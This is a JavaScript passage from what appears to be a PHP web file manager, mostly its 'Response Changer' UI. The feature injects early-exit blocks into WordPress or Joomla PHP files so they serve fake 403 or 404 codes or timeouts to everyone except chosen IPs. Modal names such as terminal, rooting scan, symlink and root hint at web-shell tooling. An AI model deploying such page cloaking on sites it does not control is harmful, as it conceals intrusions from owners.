function closeMod(id){document.getElementById(id)?.classList.remove('open');if(id==='configInspectorOv'&&typeof resetConfigInspectorView==='function')resetConfigInspectorView();if(id==='rootingScanOv'&&typeof resetRootingScanView==='function')resetRootingScanView();if(id==='mfmOv'&&typeof mfaWatch==='function')[mfaWatch(false),typeof mfaDrawer==='function'&&mfaDrawer(false)];}
document.addEventListener('keydown',e=>{
  if(e.key!=='Escape')return;
  ['prevOv','fileInfoOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','cleanupOv','cleanupStatusOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','configInspectorOv','rootingScanOv','responseChangerOv','privOv','sessOv','guardOv','sfgOv','ownOv','rootOv','bpOv','mfmOv','pmaOv'].forEach(closeMod);
  closeSheet();closeCtx();
});
['prevOv','fileInfoOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','cleanupOv','cleanupStatusOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','configInspectorOv','rootingScanOv','responseChangerOv','ownOv','rootOv','bpOv'].forEach(id=>{
  document.getElementById(id)?.addEventListener('click',e=>{if(e.target===document.getElementById(id))closeMod(id);});
});
document.getElementById('fileInfoClose')?.addEventListener('click',()=>closeMod('fileInfoOv'));

/* ═══════════════════════════════════════
   RESPONSE CHANGER
═══════════════════════════════════════ */
const rcOv=document.getElementById('responseChangerOv');
const rcItems=document.getElementById('rcItems');
let rcDirectory=CWD,rcEntries=[],rcManagerConfig=null,rcParent='';
const rcStatusCatalog=[
  {label:'Most used',items:[
    [200,'OK'],[201,'Created'],[202,'Accepted'],[204,'No Content'],
    [301,'Moved Permanently'],[302,'Found'],[304,'Not Modified'],[307,'Temporary Redirect'],[308,'Permanent Redirect'],
    [400,'Bad Request'],[401,'Unauthorized'],[403,'Forbidden'],[404,'Not Found'],[405,'Method Not Allowed'],
    [408,'Request Timeout'],[409,'Conflict'],[410,'Gone'],[413,'Content Too Large'],
    [415,'Unsupported Media Type'],[418,"I'm a teapot"],[422,'Unprocessable Content'],[429,'Too Many Requests'],
    [451,'Unavailable For Legal Reasons'],[500,'Internal Server Error'],[501,'Not Implemented'],
    [502,'Bad Gateway'],[503,'Service Unavailable'],[504,'Gateway Timeout']
  ]},
  {label:'Other standard success codes',items:[
    [203,'Non-Authoritative Information'],[205,'Reset Content'],[206,'Partial Content'],
    [207,'Multi-Status'],[208,'Already Reported'],[226,'IM Used']
  ]},
  {label:'Other standard redirect codes',items:[
    [300,'Multiple Choices'],[303,'See Other'],[305,'Use Proxy (deprecated)']
  ]},
  {label:'Other standard client error codes',items:[
    [402,'Payment Required'],[406,'Not Acceptable'],[407,'Proxy Authentication Required'],
    [411,'Length Required'],[412,'Precondition Failed'],[414,'URI Too Long'],
    [416,'Range Not Satisfiable'],[417,'Expectation Failed'],[421,'Misdirected Request'],
    [423,'Locked'],[424,'Failed Dependency'],[425,'Too Early'],[426,'Upgrade Required'],
    [428,'Precondition Required'],[431,'Request Header Fields Too Large']
  ]},
  {label:'Other standard server error codes',items:[
    [505,'HTTP Version Not Supported'],[506,'Variant Also Negotiates'],[507,'Insufficient Storage'],
    [508,'Loop Detected'],[510,'Not Extended'],[511,'Network Authentication Required']
  ]},
  {label:'Common provider-specific codes',items:[
    [419,'Page Expired (framework-specific)'],[420,'Enhance Your Calm (unofficial)'],
    [444,'No Response (nginx)'],[449,'Retry With (Microsoft IIS)'],
    [450,'Blocked by Windows Parental Controls'],[498,'Invalid Token (Esri)'],
    [499,'Client Closed Request (nginx)'],[520,'Unknown Error (Cloudflare)'],
    [521,'Web Server Is Down (Cloudflare)'],[522,'Connection Timed Out (Cloudflare)'],
    [523,'Origin Is Unreachable (Cloudflare)'],[524,'A Timeout Occurred (Cloudflare)'],
    [525,'SSL Handshake Failed (Cloudflare)'],[526,'Invalid SSL Certificate (Cloudflare)'],
    [527,'Railgun Error (Cloudflare)'],[530,'Site Is Frozen (provider-specific)'],
    [598,'Network Read Timeout Error (unofficial)'],[599,'Network Connect Timeout Error (unofficial)']
  ]}
];
function rcBuildStatusCatalog(){
  [document.getElementById('rcStatusPreset'),document.getElementById('rcStatusPreset2')].forEach(select=>{
   if(!select)return;
  select.replaceChildren();
  const timeout=document.createElement('option');timeout.value='timeout';timeout.textContent='Timed out - keep the connection waiting';select.appendChild(timeout);
  rcStatusCatalog.forEach(group=>{
    const optgroup=document.createElement('optgroup');optgroup.label=group.label;
    group.items.forEach(([code,description])=>{
      const option=document.createElement('option');option.value=String(code);option.textContent=code+' - '+description;optgroup.appendChild(option);
    });
    select.appendChild(optgroup);
  });
  const custom=document.createElement('option');custom.value='custom';custom.textContent='Custom code - enter it below';select.appendChild(custom);
  });
  const first=document.getElementById('rcStatusPreset'),second=document.getElementById('rcStatusPreset2');
  if(first)first.value='403';if(second)second.value='404';
  rcSyncStatusPreset();rcSyncStatusPreset('rcStatusPreset2','rcStatusCode2');
}
function rcSyncStatusPreset(presetId='rcStatusPreset',inputId='rcStatusCode'){
  const select=document.getElementById(presetId),input=document.getElementById(inputId);
  if(!select||!input)return;
  input.disabled=select.value==='timeout';
  if(select.value==='timeout')return;
  const code=String(input.value);
  select.value=Array.from(select.options).some(option=>option.value===code)?code:'custom';
}
function rcSetStatusValue(value,presetId,inputId,defaultValue){
  const preset=document.getElementById(presetId),input=document.getElementById(inputId);
  if(!preset||!input)return;
  const text=value===null||value===undefined||value===''?String(defaultValue):String(value);
  if(text==='timeout'){preset.value='timeout';input.disabled=true;return;}
  const code=Number(text);
  if(Number.isInteger(code)&&code>=200&&code<=599)input.value=String(code);
  else input.value=String(defaultValue);
  input.disabled=false;rcSyncStatusPreset(presetId,inputId);
}
function rcUpdateStatusCount(){
  const count=document.getElementById('rcStatusCount')?.value||'one';
  const field=document.getElementById('rcSecondStatusField');
  if(field)field.hidden=count!=='two';
}
function rcBindStatusControls(presetId,inputId){
  document.getElementById(presetId)?.addEventListener('change',()=>{
    const preset=document.getElementById(presetId),input=document.getElementById(inputId);
    if(!preset||!input)return;
    if(preset.value==='custom'){input.disabled=false;input.focus();return;}
    input.disabled=preset.value==='timeout';
    if(preset.value!=='timeout')input.value=preset.value;
  });
  document.getElementById(inputId)?.addEventListener('input',()=>{
    const input=document.getElementById(inputId);if(input)input.disabled=false;
    rcSyncStatusPreset(presetId,inputId);
  });
}
function rcSetMessage(message,color=''){
  const el=document.getElementById('rcMessage');if(!el)return;
  el.textContent=message||'';el.style.color=color||'var(--t2)';
}
function rcStatusSummary(config){
  if(!config)return'';
  const first=String(config.status??'');
  return config.status2!==null&&config.status2!==undefined&&config.status2!==''?first+' / '+String(config.status2)+' (random)':first;
}
function rcSetSettings(config){
  if(!config)return;
  const mode=document.getElementById('rcMode'),ips=document.getElementById('rcIps');
  const statusCount=document.getElementById('rcStatusCount');
  const responseDelay=document.getElementById('rcResponseDelay');
  const hasSecond=config.status2!==null&&config.status2!==undefined&&config.status2!=='';
  if(statusCount)statusCount.value=hasSecond?'two':'one';
  rcSetStatusValue(config.status,'rcStatusPreset','rcStatusCode',403);
  rcSetStatusValue(hasSecond?config.status2:404,'rcStatusPreset2','rcStatusCode2',404);
  rcUpdateStatusCount();
  if(responseDelay)responseDelay.value=Array.from(responseDelay.options).some(option=>option.value===config.response_delay)?config.response_delay:'actual';
  if(mode&&['all','blacklist','whitelist'].includes(config.mode))mode.value=config.mode;
  if(ips&&Array.isArray(config.ips))ips.value=config.ips.join('\n');
  rcUpdateMode();
}
function rcUpdateMode(){
  const mode=document.getElementById('rcMode')?.value||'all';
  const field=document.getElementById('rcIpField'),label=document.getElementById('rcIpLabel'),ips=document.getElementById('rcIps');
  if(field)field.hidden=mode==='all';
  if(label)label.textContent=mode==='blacklist'?'Blocked IP addresses':'Allowed IP addresses';
  if(ips)ips.placeholder=mode==='blacklist'?'Visitors at these IPs receive the selected status':'Only these IPs can view the original page';
}
function rcSelection(){
  const files=Array.from(document.querySelectorAll('#rcItems [data-rc-file]:checked')).map(x=>x.value);
  return{files,manager:!!document.getElementById('rcManagerTarget')?.checked};
}
function rcUpdateSelection(){
  const selected=rcSelection(),count=selected.files.length+(selected.manager?1:0);
  const counter=document.getElementById('rcSelectedCount');
  if(counter)counter.textContent=count+' selected';
  const selectedEntries=rcEntries.filter(f=>selected.files.includes(f.name));
  const sensitive=selectedEntries.filter(f=>f.sensitive_reason);
  const warning=document.getElementById('rcCmsWarning');
  if(warning){
    warning.hidden=sensitive.length===0;
    warning.textContent=sensitive.length
      ?'Sensitive WordPress/Joomla file(s): '+sensitive.map(f=>f.name+' ('+f.sensitive_reason+')').join(', ')+'. Early exit can prevent the CMS, admin area, plugins, or included pages from working. Confirmation is required.'
      :'Selected WordPress or Joomla files are sensitive. Changing their early response can prevent the CMS, admin area, plugins, or included pages from working. Confirm before applying.';
  }
  if(selected.files.length===1){
    const file=selectedEntries[0];if(file?.active)rcSetSettings(file);
  }else if(selected.manager&&rcManagerConfig)rcSetSettings(rcManagerConfig);
}
function rcRender(data){
  rcDirectory=data.dir;rcParent=data.parent||'';rcEntries=Array.isArray(data.files)?data.files:[];
  const path=document.getElementById('rcPath');if(path)path.textContent=rcDirectory;
  const up=document.getElementById('rcUp');if(up)up.disabled=!rcParent;
  const manager=data.manager;
  const clientIp=String(data.client_ip||'');
  const clientIpLabel=document.getElementById('rcClientIp'),addClientIp=document.getElementById('rcAddClientIp');
  if(clientIpLabel)clientIpLabel.textContent=clientIp||'unavailable';
  if(addClientIp){addClientIp.disabled=!clientIp;addClientIp.dataset.ip=clientIp;}
  rcManagerConfig=manager?.enabled?manager:null;
  const managerCheck=document.getElementById('rcManagerTarget'),managerBadge=document.getElementById('rcManagerStatus');
  if(managerCheck)managerCheck.checked=false;
  if(managerBadge){
      managerBadge.textContent=manager?.enabled?`Active · ${rcStatusSummary(manager)} · ${manager.response_delay||'actual'} · ${manager.mode}`:'Not active';
    managerBadge.className='rc-badge'+(manager?.enabled?' active':'');
  }
  const rows=[];
  (data.folders||[]).forEach(folder=>{
    rows.push(`<button type="button" class="rc-row" data-rc-dir="${esc(rcDirectory+'/'+folder.name)}"><svg viewBox="0 0 24 24" width="15" height="15" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6.5A1.5 1.5 0 0 1 4.5 5H10l2 2h7.5A1.5 1.5 0 0 1 21 8.5v9a1.5 1.5 0 0 1-1.5 1.5h-15A1.5 1.5 0 0 1 3 17.5z"/><path d="M3 9h18"/></svg><span class="rc-row-name">${esc(folder.name)}</span><span class="rc-badge">Folder</span></button>`);
  });
  rcEntries.forEach(file=>{
    const tags=[];
     if(file.active)tags.push('<span class="rc-badge active">Active · '+esc(rcStatusSummary(file))+' '+esc(file.response_delay||'actual')+' '+esc(file.mode)+'</span>');
    if(file.sensitive_reason)tags.push('<span class="rc-badge warn">Sensitive</span>');
    if(file.marker_error)tags.push('<span class="rc-badge warn">Marker issue</span>');
    rows.push(`<label class="rc-row"><input class="rc-file-check" type="checkbox" data-rc-file value="${esc(file.name)}" ${file.readable?'':'disabled'}><span class="rc-row-name" title="${esc(file.name)}">${esc(file.name)}</span><span class="rc-row-meta">${tags.join('')}</span></label>`);
  });
  if(!rows.length)rows.push('<div style="padding:18px;color:var(--t3)">No folders or PHP files in this folder.</div>');
  if(rcItems)rcItems.innerHTML=rows.join('');
  rcSetMessage('');
  rcUpdateSelection();
}
async function rcLoadDirectory(path=rcDirectory){
  if(!rcItems)return;
  rcItems.innerHTML='<div style="padding:18px;color:var(--t3)">Loading PHP files…</div>';
  try{
    const response=await fetch('?x=response_changer_list&dir='+encodeURIComponent(path),{cache:'no-store',credentials:'same-origin'});
    const data=await response.json();
    if(!response.ok||!data.ok)throw new Error(data.error||'Could not open this folder.');
    rcRender(data);
  }catch(error){
    if(rcItems)rcItems.innerHTML='<div style="padding:18px;color:#fca5a5">'+esc(error.message||'Folder listing failed.')+'</div>';
  }
}
function rcOpen(){
  if(!rcOv)return;
  rcDirectory=CWD;rcEntries=[];rcManagerConfig=null;
  const count=document.getElementById('rcStatusCount');if(count)count.value='one';rcUpdateStatusCount();
  rcSetStatusValue(403,'rcStatusPreset','rcStatusCode',403);
  rcSetStatusValue(404,'rcStatusPreset2','rcStatusCode2',404);
  const responseDelay=document.getElementById('rcResponseDelay');if(responseDelay)responseDelay.value='actual';
  const managerCheck=document.getElementById('rcManagerTarget');if(managerCheck)managerCheck.checked=false;
  rcSetMessage('');rcUpdateMode();openMod('responseChangerOv');rcLoadDirectory(rcDirectory);
}
rcBuildStatusCatalog();
document.getElementById('responseChangerBtn')?.addEventListener('click',rcOpen);
document.getElementById('responseChangerClose')?.addEventListener('click',()=>closeMod('responseChangerOv'));
rcBindStatusControls('rcStatusPreset','rcStatusCode');
rcBindStatusControls('rcStatusPreset2','rcStatusCode2');
document.getElementById('rcStatusCount')?.addEventListener('change',rcUpdateStatusCount);
document.getElementById('rcMode')?.addEventListener('change',rcUpdateMode);
document.getElementById('rcAddClientIp')?.addEventListener('click',()=>{
  const button=document.getElementById('rcAddClientIp'),ips=document.getElementById('rcIps'),ip=String(button?.dataset.ip||'');
  if(!ips||!ip)return;
  const current=ips.value.trim(),items=current.split(/[\s,;]+/).filter(Boolean);
  if(!items.some(item=>item.toLowerCase()===ip.toLowerCase()))ips.value=(current?current+'\n':'')+ip;
});
document.getElementById('rcUp')?.addEventListener('click',()=>{if(rcParent)rcLoadDirectory(rcParent);});
document.getElementById('rcRefresh')?.addEventListener('click',()=>rcLoadDirectory(rcDirectory));
document.getElementById('rcSelectAll')?.addEventListener('click',()=>{
  const boxes=Array.from(document.querySelectorAll('#rcItems [data-rc-file]:not(:disabled)'));
  const select=boxes.some(box=>!box.checked);boxes.forEach(box=>box.checked=select);rcUpdateSelection();
});
rcItems?.addEventListener('change',e=>{
  if(e.target.matches('[data-rc-file]'))rcUpdateSelection();
});
document.getElementById('rcManagerTarget')?.addEventListener('change',rcUpdateSelection);
rcItems?.addEventListener('click',e=>{
  const folder=e.target.closest('[data-rc-dir]');if(folder)rcLoadDirectory(folder.dataset.rcDir);
});
async function rcSubmit(operation,confirmedSensitive=false){
  const selection=rcSelection();
  if(!selection.files.length&&!selection.manager){rcSetMessage('Select one or more PHP files or the special File Manager target.','#fbbf24');return;}
  const selectedEntries=rcEntries.filter(f=>selection.files.includes(f.name));
  const sensitive=operation==='enable'?selectedEntries.filter(f=>f.sensitive_reason):[];
  let confirmSensitive=confirmedSensitive;
  if(sensitive.length&&!confirmSensitive&&!confirm('Sensitive WordPress/Joomla files selected:\n\n'+sensitive.map(f=>f.name+' - '+f.sensitive_reason).join('\n')+'\n\nThis can stop the CMS page or any page that includes these files. Continue?'))return;
  if(sensitive.length)confirmSensitive=true;
  if(operation==='disable'&&!confirm(`Remove the managed Response Changer block from ${selection.files.length+(selection.manager?1:0)} selected target(s)? Other file content will be kept.`))return;
   if(operation==='enable'&&selection.manager&&document.getElementById('rcMode')?.value==='all'){
     if(!confirm('This will return the chosen response, or randomly choose between the two codes, for all non-admin visitors to the File Manager. Signed-in administrators will retain access. Continue?'))return;
  }
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('operation',operation);fd.append('dir',rcDirectory);
  fd.append('files_json',JSON.stringify(selection.files));fd.append('manager_target',selection.manager?'1':'0');
  if(operation==='enable'){
     const readStatus=(presetId,inputId)=>{
       const preset=document.getElementById(presetId)?.value||'';
       return preset==='timeout'?'timeout':document.getElementById(inputId)?.value||'';
     };
     fd.append('status',readStatus('rcStatusPreset','rcStatusCode'));
     fd.append('status2',document.getElementById('rcStatusCount')?.value==='two'?readStatus('rcStatusPreset2','rcStatusCode2'):'');
    fd.append('response_delay',document.getElementById('rcResponseDelay')?.value||'actual');
    fd.append('mode',document.getElementById('rcMode')?.value||'all');
    fd.append('ips',document.getElementById('rcIps')?.value||'');
    fd.append('confirm_sensitive',confirmSensitive?'1':'0');
  }
  const apply=document.getElementById('rcApply'),disable=document.getElementById('rcDisable');
  if(apply)apply.disabled=true;if(disable)disable.disabled=true;rcSetMessage(operation==='enable'?'Applying…':'Disabling…');
  try{
    const response=await fetch('?x=response_changer_apply',{method:'POST',body:fd,cache:'no-store',credentials:'same-origin'});
    const data=await response.json();
    if(data.needs_confirmation){
      const names=(data.sensitive||[]).map(x=>x.name+' - '+x.reason).join('\n');
      if(confirm('Sensitive WordPress/Joomla pages selected:\n\n'+names+'\n\nThese files may stop working or affect included pages. Continue?'))return rcSubmit(operation,true);
      rcSetMessage('No changes were made. Confirmation was not given.','#fbbf24');return;
    }
    const lines=(data.results||[]).map(x=>x.name+': '+(x.ok?(x.changed?'updated':'already inactive'):(x.error||'failed')));
    const allSucceeded=response.ok&&data.ok&&(data.results||[]).every(x=>x.ok);
    if(!response.ok||!data.ok) {
      const detail=(data.results||[]).filter(x=>!x.ok).map(x=>x.name+': '+(x.error||'failed')).join('\n');
      if(!lines.length)throw new Error([data.error,detail].filter(Boolean).join('\n')||'The operation failed.');
    }
    const resultMessage=[data.error,...lines].filter(Boolean).join('\n')||'No changes were needed.';
    const managerCheck=document.getElementById('rcManagerTarget');if(managerCheck)managerCheck.checked=false;
    await rcLoadDirectory(rcDirectory);
    rcSetMessage(resultMessage,allSucceeded?'#86efac':'#fca5a5');
    toast(allSucceeded?(operation==='enable'?'Response rule applied.':'Response rule disabled.'):'Some selected targets could not be changed.');
  }catch(error){rcSetMessage(error.message||'Response Changer request failed.','#fca5a5');}
  finally{if(apply)apply.disabled=false;if(disable)disable.disabled=false;}
}
document.getElementById('rcApply')?.addEventListener('click',()=>rcSubmit('enable'));
document.getElementById('rcDisable')?.addEventListener('click',()=>rcSubmit('disable'));

